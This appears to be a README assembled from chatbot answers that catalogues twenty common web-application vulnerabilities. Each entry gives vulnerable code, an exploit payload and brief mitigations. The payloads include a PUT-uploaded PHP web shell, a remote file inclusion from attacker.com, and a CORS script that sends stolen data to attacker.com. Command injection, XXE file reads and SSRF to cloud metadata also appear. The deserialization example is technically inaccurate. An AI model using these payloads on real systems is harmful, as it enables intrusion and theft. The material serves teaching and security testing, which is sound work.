# Vulnerable-for-web-applications-
Great question! Here's a **focused breakdown of methods that are typically vulnerable in web applications** — by "methods," we can refer to both **HTTP methods** (like GET, POST) and **programming logic methods/functions** that are commonly exploited.

---

## 🔥 **Common Vulnerable Methods in Web Applications**

### 🧩 1. **HTTP Methods Misconfigurations**
These methods can be misused if not properly restricted:

- **GET** – Vulnerable to:
  - Information disclosure
  - Reflected XSS
  - IDOR (Insecure Direct Object Reference)
  
- **POST** – Often used in:
  - SQLi
  - CSRF
  - Broken authentication
  
- **PUT / DELETE / PATCH** – Should be **disabled unless explicitly needed**
  - PUT → Upload arbitrary files
  - DELETE → Remove sensitive data
  - PATCH → Modify server resources
  - These can lead to full **RCE** or server takeover

- **OPTIONS** – May reveal supported methods via **CORS misconfigurations**

---

### 💥 2. **Vulnerable Application Methods/Functions**
These are coding patterns or logic commonly exploited:

| Method/Function | Vulnerability | Description |
|------------------|------------------|-------------|
| `eval()` / `exec()` (JS, PHP, Python) | RCE | Executes arbitrary code |
| `system()` / `popen()` | Command Injection | Executes system commands |
| `include()` / `require()` (PHP) | LFI/RFI | Can include malicious files |
| `deserialize()` (Python, PHP, Java) | Insecure Deserialization | Leads to code execution |
| `file_get_contents()` (PHP) | SSRF / RFI | Used to read external/internal resources |
| URL parameters (e.g., `?id=123`) | IDOR | Changing values may expose other users' data |
| Unvalidated `redirect()` calls | Open Redirect | Redirects users to external malicious sites |

---

### 🎯 Examples of Exploitable Methods

#### ✅ GET
```http
GET /profile?id=1001
→ Change id to another user = IDOR
```

#### ✅ POST
```http
POST /transfer
body: amount=1000&to=12345
→ If no CSRF token = CSRF attack
```

#### ✅ PUT (Misconfigured)
```bash
curl -X PUT -d @shell.php http://target.com/uploads/shell.php
```

#### ✅ eval() Misuse
```php
$input = $_GET['cmd'];
eval($input); // Dangerous!
```

---

### 🧪 How to Test These Vulnerabilities
- **Burp Suite** – Intercept traffic & test for injection points.
- **Nmap --script http-methods** – Detect enabled HTTP methods.
- **Nikto** – Detect dangerous HTTP methods.
- **FFUF / Dirsearch** – Find hidden endpoints or methods.

---

### 🛡️ Mitigation Tips
- Limit HTTP methods to only those required.
- Use parameterized queries (to avoid SQLi).
- Sanitize all user input.
- Disable dangerous functions (e.g., `eval`, `exec`).
- Implement strong access control & auth checks.
- Validate redirects and uploaded files strictly.

---

Absolutely! Let's dive into **detailed examples** of vulnerable methods in **web applications**, covering how they're **exploited**, how the code looks, and what's happening behind the scenes.

---

## 🔥 1. **SQL Injection (SQLi)**

### 🧪 Vulnerable Code (PHP)
```php
$id = $_GET['id'];
$query = "SELECT * FROM users WHERE id = '$id'";
$result = mysqli_query($conn, $query);
```

### 🚨 Exploit
```http
GET /user.php?id=1' OR '1'='1
```

**What happens:** The SQL query becomes:
```sql
SELECT * FROM users WHERE id = '1' OR '1'='1'
```
➡ Returns **all users** instead of just one.

---

## 🔥 2. **Cross-Site Scripting (XSS)**

### 🧪 Vulnerable Code (JavaScript / HTML)
```html
<p>Welcome, <?php echo $_GET['name']; ?></p>
```

### 🚨 Exploit
```http
GET /index.php?name=<script>alert('XSS')</script>
```

**What happens:** Script executes in the user’s browser → Can steal cookies, deface pages, etc.

---

## 🔥 3. **Command Injection**

### 🧪 Vulnerable Code (Python)
```python
import os
ip = request.GET.get('ip')
os.system("ping -c 1 " + ip)
```

### 🚨 Exploit
```http
GET /ping?ip=127.0.0.1;whoami
```

**What happens:** Runs:
```bash
ping -c 1 127.0.0.1;whoami
```
➡ Executes arbitrary system command (`whoami`).

---

## 🔥 4. **Local File Inclusion (LFI)**

### 🧪 Vulnerable Code (PHP)
```php
$page = $_GET['page'];
include($page . ".php");
```

### 🚨 Exploit
```http
GET /index.php?page=../../../../etc/passwd
```

**What happens:** Reads sensitive server files.

---

## 🔥 5. **Remote File Inclusion (RFI)**

### 🧪 Vulnerable Code (PHP)
```php
$url = $_GET['url'];
include($url);
```

### 🚨 Exploit
```http
GET /index.php?url=http://attacker.com/shell.txt
```

**What happens:** Loads malicious code from remote server → Remote Code Execution.

---

## 🔥 6. **Insecure Direct Object Reference (IDOR)**

### 🧪 Vulnerable URL
```http
GET /invoice?user_id=1002
```

### 🚨 Exploit
```http
Change user_id=1002 to user_id=1003
```

**What happens:** Attacker views another user's invoice without auth checks.

---

## 🔥 7. **Cross-Site Request Forgery (CSRF)**

### 🧪 Vulnerable Transfer Request
```http
POST /transfer
amount=1000&to=123456
```

### 🚨 Exploit (CSRF HTML)
```html
<form action="http://victim.com/transfer" method="POST">
  <input type="hidden" name="amount" value="1000">
  <input type="hidden" name="to" value="attacker">
  <input type="submit">
</form>
```

**What happens:** If the victim is logged in, the form auto-submits in the background → transfers money.

---

## 🔥 8. **Unvalidated Redirect**

### 🧪 Vulnerable Code
```php
$redirect = $_GET['next'];
header("Location: $redirect");
```

### 🚨 Exploit
```http
GET /redirect.php?next=http://phishing.com
```

**What happens:** User gets redirected to malicious site → phishing or malware.

---

## 🔥 9. **Deserialization Attack**

### 🧪 Vulnerable PHP Code
```php
$data = $_GET['data'];
$user = unserialize($data);
```

### 🚨 Exploit
Send malicious serialized object:
```php
O:8:"UserData":1:{s:4:"name";s:12:"<?php phpinfo(); ?>"}
```

**What happens:** Deserializes and runs injected PHP code.

---

## 🔥 10. **Exposed PUT Method**

### 🧪 Misconfigured Web Server
Allows `PUT` requests.

### 🚨 Exploit
```bash
curl -X PUT -d "<?php system($_GET['cmd']); ?>" http://target.com/shell.php
```

**What happens:** Uploads a PHP web shell.

Access it:
```http
http://target.com/shell.php?cmd=whoami
```

---

## 🛠️ Want More?

I can give:
- Custom **payloads** (for Burp, curl, etc.)
- A lab setup using **DVWA**, **bWAPP**, or **HackTheBox**
- Scripts to **automate detection**
- A full **checklist** for manual testing

You got it! Let’s go **deeper** into web app vulnerability examples — covering some **intermediate to advanced techniques**. These examples will include the vulnerable logic, **realistic payloads**, and the **impact** of exploitation.

---

## 🔥 11. **Server-Side Request Forgery (SSRF)**

### 🧪 Vulnerable Code (PHP)
```php
$img_url = $_GET['url'];
$image = file_get_contents($img_url);
```

### 🚨 Exploit
```http
GET /load?url=http://127.0.0.1:8000/admin
```

**What happens:** The server requests internal services. This can:
- Scan internal networks
- Access cloud metadata (`http://169.254.169.254/`)
- Bypass firewall restrictions

---

## 🔥 12. **Broken Access Control**

### 🧪 Admin Panel Unprotected
```http
GET /admin/deleteUser?uid=42
```

No auth check, but only admins should access this.

### 🚨 Exploit
User manually navigates to that endpoint → deletes other users.

---

## 🔥 13. **XML External Entity Injection (XXE)**

### 🧪 Vulnerable XML Parser
```php
libxml_disable_entity_loader(false);
$xml = simplexml_load_string($_POST['xml']);
```

### 🚨 Exploit Payload
```xml
<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <data>&xxe;</data>
</root>
```

**What happens:** The app loads system files like `/etc/passwd` into the response.

---

## 🔥 14. **Mass Assignment**

### 🧪 Vulnerable Logic (Node.js / Express + Mongoose)
```javascript
User.updateOne({ _id: req.user.id }, req.body);
```

### 🚨 Exploit
```json
{
  "isAdmin": true
}
```

**What happens:** Attacker updates their account and escalates to admin.

---

## 🔥 15. **HTTP Host Header Attack**

### 🧪 Vulnerable Redirect Logic
```php
$redirect = "http://" . $_SERVER['HTTP_HOST'] . "/login";
```

### 🚨 Exploit
```http
Host: evil.com
```

**What happens:** Redirects users to an attacker-controlled domain → phishing or session hijack.

---

## 🔥 16. **Path Traversal in File Upload**

### 🧪 Vulnerable Upload Code
```php
$filename = $_FILES['file']['name'];
move_uploaded_file($_FILES['file']['tmp_name'], "/uploads/" . $filename);
```

### 🚨 Exploit
Filename: `../../../../var/www/html/shell.php`

**What happens:** Places a **web shell** in a public directory:
```http
http://target.com/shell.php?cmd=id
```

---

## 🔥 17. **Open CORS (Cross-Origin Resource Sharing)**

### 🧪 Misconfigured Server
```http
Access-Control-Allow-Origin: *
```

### 🚨 Exploit
- Attacker’s JS on another domain can make authenticated requests.
- Example:
```javascript
fetch("https://target.com/api/user", {credentials: 'include'})
  .then(res => res.text())
  .then(data => fetch("https://attacker.com/steal?data=" + data));
```

---

## 🔥 18. **Clickjacking**

### 🧪 No `X-Frame-Options` Header

### 🚨 Exploit
Attacker embeds target in iframe:
```html
<iframe src="https://target.com/transfer" style="opacity:0;position:absolute;"></iframe>
```

**What happens:** User clicks on invisible button (like “Transfer Money”) without realizing it.

---

## 🔥 19. **JWT Forgery (None Algorithm)**

### 🧪 Vulnerable Backend (misconfigured JWT parser)
- Accepts token with `alg: none` (no signature check)

### 🚨 Exploit
Craft JWT:
```json
{
  "alg": "none",
  "typ": "JWT"
}.
{
  "user": "admin"
}
```

**What happens:** No signature → Attacker is admin.

---

## 🔥 20. **Race Conditions**

### 🧪 Vulnerable Logic
```python
if user.balance >= amount:
    user.balance -= amount
    recipient.balance += amount
```

### 🚨 Exploit
- Attacker sends **multiple simultaneous requests** to transfer money.
- Balance is checked but **not locked** between requests.

**What happens:** User's account goes into negative or duplicates funds.

---

### 🛠️ Testing Tools for These

| Tool | Use |
|------|-----|
| Burp Suite | Manual and automated testing |
| OWASP ZAP | Free web scanner |
| ffuf / dirsearch | Content discovery |
| sqlmap | SQLi automation |
| wfuzz | Fuzzing |
| nuclei | Template-based vuln scanner |
| XSStrike | Advanced XSS scanner |
| SSRFmap | SSRF automation |
| JWT.io / jwt_tool | JWT tampering |
| Nikto | General web server scanning |

---

Let me know if you want a:
- Checklist for **bug bounty hunting**
- Ready-made **Burp Suite payload list**
- Script for scanning specific vulnerabilities
- Setup for a **testing lab** (like DVWA or WebGoat)

You’re getting into some real hacker mode now 💻💣 Want to go deeper?
